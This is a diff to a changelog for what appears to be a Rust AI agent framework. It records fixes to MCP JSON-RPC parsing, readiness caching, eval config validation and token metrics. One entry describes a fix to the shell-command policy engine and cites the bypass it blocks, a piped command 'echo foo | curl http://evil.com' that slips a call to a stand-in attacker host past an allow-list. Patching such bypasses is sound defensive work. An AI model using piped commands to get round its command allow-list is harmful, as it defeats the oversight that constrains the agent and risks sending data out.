@@ -59,7 +59,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **Agent loop deduplication** — Extracted shared `run_agent_loop_inner()` function containing all iteration logic (~400 lines). Both `run_agent_loop_with_registry` and `run_agent_loop_with_mcp_and_registry` now delegate to it, eliminating near-identical code duplication. (#dedup)
 
 ### Fixed
-*(none)*
+- **MCP server JSON-RPC `params` made optional** — `JsonRpcRequest.params` changed from `serde_json::Value` to `Option<serde_json::Value>` per JSON-RPC 2.0 spec. All access sites updated to handle `None` gracefully. Fixes deserialization failure when MCP clients omit `params`. (#mcp-params-optional)
+- **Pipe detection in policy engine** — `check_shell_command()` now validates each pipeline segment independently. Prevents bypassing allow-lists via piped commands like `echo foo | curl http://evil.com`. (#pipe-policy)
+- **`/ready` endpoint caching** — Added timestamp-based readiness cache with 30s TTL. `/ready` now only makes an LLM connectivity check once every 30 seconds instead of on every probe, reducing latency from ~1.26s to near-instant for cached responses. (#ready-caching)
+- **Empty eval config validation** — `EvalConfig::from_file()` now rejects empty files and configs with zero tasks with a clear error message instead of silently returning score 0.0. (#eval-empty-config)
+
+### Changed
+- **Token tracking wired to HTTP server metrics** — Added `metrics_callback` field to `AgentLoopConfig`. The HTTP server's `handle_chat` now passes a callback that records token usage and tool call counts to `ServerMetrics`. `#[allow(dead_code)]` removed from `record_llm_request()` and `record_tool_call()`. (#token-tracking)
+- **`AgentLoopConfig` manual Debug/Clone** — `Debug` and `Clone` are now implemented manually instead of derived, because `metrics_callback` is a boxed closure that doesn't implement either trait. Clone intentionally drops the callback (only the original caller needs it). (#agent-loop-config-manual-impls)
 
 ### Removed
 *(none)*
